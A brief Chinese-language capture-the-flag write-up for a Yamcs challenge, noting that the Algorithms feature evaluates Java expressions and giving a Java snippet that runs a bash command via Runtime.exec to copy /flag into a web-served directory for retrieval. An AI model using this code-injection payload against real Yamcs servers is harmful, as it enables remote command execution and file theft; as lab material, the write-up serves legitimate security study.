---
tags: [Java表达式注入, RCE, Yamcs]
---

# yamcs 

https://dl.yamcs.org/docs/yamcs-server-manual.pdf

Algorithms 功能可以执行 Java 表达式

题目环境不出网 ，可以将 flag 写到 web 目录下

```
1
2  try {
3    java.lang.Runtime.getRuntime().exec(new String[] {"bash", "-c", "echo `cat
/flag` > /build/quickstart/target/yamcs/cache/yamcs-web/flag.txt"});
4   } catch (Exception e) {
5
6   }
7
```

然后访问即可